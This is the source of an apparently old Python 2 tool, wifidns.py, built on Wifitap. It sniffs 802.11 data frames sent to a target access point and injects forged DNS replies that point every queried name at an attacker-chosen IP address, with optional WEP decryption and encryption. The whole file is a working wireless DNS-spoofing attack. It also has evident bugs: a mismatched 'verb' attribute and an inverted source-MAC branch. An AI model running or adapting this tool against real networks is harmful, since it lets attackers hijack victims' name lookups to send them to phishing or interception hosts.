#! /usr/bin/env python

########################################
#
# wifidns.py --- WiFi injection DNS answering tool based on Wifitap
#
# Copyright (C) 2005 Cedric Blancher <sid@rstack.org>
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation; version 2.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
#########################################

import os
import sys
import argparse
import struct
import logging
import utils

from socket import *
from fcntl  import ioctl
from select import select

logging.getLogger("scapy").setLevel(1)

#from scapy  import Raw,Ether,PrismHeader,Dot11,Dot11WEP,LLC,SNAP,sendp,conf
from scapy.all import Raw,Ether,PrismHeader,Dot11,Dot11WEP,LLC,SNAP,sendp,conf,RadioTap
from scapy.all  import IP,UDP,DNS,DNSRR

def setup():

    global conf

    parser = argparse.ArgumentParser()

    parser.add_argument('-b',
                    dest='bssid',
                    type=utils.sanitize_bssid,
                    required=True,
                    help='Specify BSSID for injection')

    parser.add_argument('-i',
                    dest='in_iface',
                    default='wlan0',
                    type=str,
                    help='Specify iface for injection (default: wlan0)')

    parser.add_argument('-o',
                    dest='out_iface',
                    default='wlan0',
                    type=str,
                    help='Specify iface for injection (default: wlan0)')

    parser.add_argument('-a',
                    dest='ipdns',
                    required=True,
                    type=utils.sanitize_ipdns,
                    help="Specify IP address for DNS answers.")

    parser.add_argument('-s',
                    dest='smac',
                    type=utils.sanitize_smac,
                    help='Specify source MAC address for injected frames.')

    parser.add_argument('-w',
                    dest='wepkey',
                    type=str,
                    help='WEP mode and key')

    parser.add_argument('-k',
                    dest='keyid',
                    type=int,
                    choices=xrange(0,4),
                    default=0,
                    help='WEP key id (default: 0)')

    parser.add_argument('-d',
                    dest='debug',
                    action='store_true',
                    help='Activate debug mode.')

    parser.add_argument('-v',
                    dest='verbe',
                    action='store_true',
                    help='Use verbose debugging.')

    parser.add_argument('-t',
                    dest='ttl',
                    type=int,
                    default=64,
                    help='Set TTL (default: 64)')

    args = parser.parse_args()

    # validate wepkey if WEP in use
    if args.wepkey is not None:
        wepkey = utils.parse_wep_key(args.wepkey, args.keyid)
        if wepkey is None:
            parser.print_usage()
            print
            print '[!] Invalid WEP key'
            sys.exit()
    
    conf.iface = args.out_iface
    conf.wepkey = args.wepkey

    return args

def print_options(options):

    print "out_iface:  %s" % options.out_iface
    print "bssid:      %s" % options.bssid
    print "ttl:        %s" % options.ttl
    print "ipdns:      %s" % options.ipdns
    if options.smac is not None:
    
        print "smac:       %s" % options.smac
    
    if options.wepkey is not None:

        print "WEP key:    %s (%dbits)" % (options.wepkey, len(options.wepkey)*4)

    print 'DEBUG mode:', options.debug

if __name__ == '__main__':

    options = setup()

    # Here we put a BPF filter so only 802.11 Data/to-DS frames are captured
    s = conf.L2listen(iface=options.in_iface,
                    filter="link[0]&0xc == 8 and link[1]&0xf == 1")
    
    # Speed optimization si Scapy does not have to parse payloads
    DNS.payload_guess=[]
    
    try:
        while True:
            dot11_frame = s.recv(2346)
            
            # WEP handling is automagicly done by Scapy if conf.wepkey is set
            # Nothing to do to decrypt
            # WEP frames have Dot11WEP layer, others don't
            if options.debug and options.verb:
                if dot11_frame.haslayer(Dot11WEP): # WEP frame
                    os.write(1,"Received WEP from %s\n" % options.in_iface)
                else: # Cleartext frame
                    os.write(1,"Received from %s\n" % options.in_iface)
                    os.write(1,"%s\n" % dot11_frame.summary())
            
            if dot11_frame.getlayer(Dot11).addr1 != options.bssid:
                continue
            
            # Identifying DNS Queries
            if dot11_frame.haslayer(DNS) and dot11_frame.getlayer(DNS).qr == 0:
                if options.debug:
                    os.write(1,"Received DNS Query on %s\n" % options.in_iface)
                    if options.verb:
                        os.write(1,"%s\n" % dot11_frame.summary())
            
                # Building DNS Reply answer for injection
                dot11_answer = RadioTap()/Dot11(type="Data",
                                            FCfield="from-DS",
                                            addr1=dot11_frame.getlayer(Dot11).addr2,
                                            addr2=options.bssid)
    
                if options.smac is not None:
                    dot11_answer.addr3 = dot11_frame.getlayer(Dot11).addr1
                else:
                    dot11_answer.addr3 = options.smac
    
                if options.wepkey is not None:
                    dot11_answer.FCfield |= 0x40
                    dot11_answer /= Dot11WEP(iv="111", keyid=options.keyid)
    
                dot11_answer /= LLC(ctrl = 3)/SNAP()/IP(src=dot11_frame.getlayer(IP).dst,
                                                    dst=dot11_frame.getlayer(IP).src,
                                                    ttl=options.ttl)
    
                dot11_answer /= UDP(sport=dot11_frame.getlayer(UDP).dport,
                                    dport=dot11_frame.getlayer(UDP).sport)
    
                dot11_answer /= DNS(id=dot11_frame.getlayer(DNS).id,
                                    qr=1,
                                    qd=dot11_frame.getlayer(DNS).qd,
                                    an=DNSRR(rrname=dot11_frame.getlayer(DNS).qd.qname,
                                        ttl=10,
                                        rdata=options.ipdns))
                 
                if options.debug:
                    os.write(1,"Sending DNS Reply on %s\n" % options.out_iface)
                    if options.verb:
                        os.write(1,"%s\n" % dot11_frame.summary())
                 
                # Frame injection :
                sendp(dot11_answer,verbose=0) # Send frame
    
    # Program killed
    except KeyboardInterrupt:
        print "\nStopped by user."
    
    s.close()
    sys.exit()
